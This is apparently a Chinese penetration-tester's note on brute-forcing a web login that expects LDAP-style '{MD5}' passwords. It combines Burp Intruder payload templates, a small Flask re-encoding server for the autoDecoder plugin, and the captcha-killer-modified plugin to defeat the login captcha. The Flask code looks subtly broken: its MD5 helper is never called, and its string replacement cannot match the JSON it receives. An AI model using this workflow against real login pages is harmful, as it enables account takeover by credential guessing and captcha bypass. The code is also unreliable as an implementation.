# ldap的md5加密配合`autoDecoder`插件、`captcha-killer-modified`插件
#autoDecoder例

需要传入的数据包为:
```bash
{"username":"admin","password":"{MD5}ISMvKXpXpadDiUoOSoAfww==","code":"YJIV"}
```

`intruder`数据包设置如下：
```bash
{"username":"admin","password":"§1§","code":"§JOEJ§"}
```

`intruder`设置如下：
![800](photo/Pasted%20image%2020220414142603.png)
![800](photo/Pasted%20image%2020220414142107.png)
![800](photo/Pasted%20image%2020220414142541.png)

由于我们只针对`intruder`里的账号密码进行爆破，所以解密接口我们用不到，直接捕捉到数据包直接返回即可：
```python
@app.route('/decode',methods=["POST"]) # 不解密  
def decrypt():  
    param = request.form.get('data')  # 获取  post 参数  
	return param  
```
加密服务端代码如下：
```python
# -*- coding:utf-8 -*-  
# author:f0ngf0ng  
  
# ldap的md5加密爆破  
  
from flask import Flask,Response,request  
from pyDes import *  
import base64,hashlib,json  
  
def hash_md5(data):  
    md = hashlib.md5()  
    md.update(str(data))  
    a = md.digest()  
    b = base64.b64encode(a)  
    return b  
  
app = Flask(__name__)  
  
@app.route('/encode',methods=["POST"])  
def encrypt():  
    param = request.form.get('dataBody')  # 获取  post 参数  
	data = json.loads(param)  
    print(data)  
    encry_param = param.replace( "password': '"+ data['password'],"password': '"+"{MD5}" + data['password']) # 密文替换明文，且添加{MD5}关键字  
    return encry_param  
  
@app.route('/decode',methods=["POST"]) # 不解密  
def decrypt():  
    param = request.form.get('dataBody')  # 获取  post 参数  
	return param  
  
if __name__ == '__main__':  
    app.debug = True # 设置调试模式，生产模式的时候要关掉debug  
    app.run(host="0.0.0.0",port="8888")
```
运行如下
```bash
python flask.py
```
`autoDecoder`设置如下：
![800](photo/Pasted%20image%2020220414141838.png)

`captcha-killer-modified`插件页面如下：
![800](photo/Pasted%20image%2020220414143000.png)
爆破如下：
![800](photo/Pasted%20image%2020220414143037.png)
